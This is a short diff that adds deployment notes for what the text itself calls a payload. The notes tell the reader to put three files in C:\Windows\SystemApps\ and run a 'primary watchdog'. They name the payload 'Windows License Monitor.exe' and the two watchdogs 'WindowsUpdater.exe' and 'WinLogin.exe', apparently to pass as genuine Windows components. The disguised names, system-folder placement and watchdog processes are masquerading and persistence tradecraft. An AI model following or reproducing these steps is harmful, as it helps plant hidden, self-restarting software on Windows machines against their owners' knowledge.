@@ -1,1 +1,8 @@
 C:\Windows\SystemApps\
+
+
+^^PUT ALL THREE FILES IN ABOVE FILEPATH THEN RUN PRIMARY WATCHDOG^^
+
+Payload Name: Windows License Monitor.exe
+Primary Watchdog Name: WindowsUpdater.exe
+Secondary Watchdog Name: WinLogin.exe
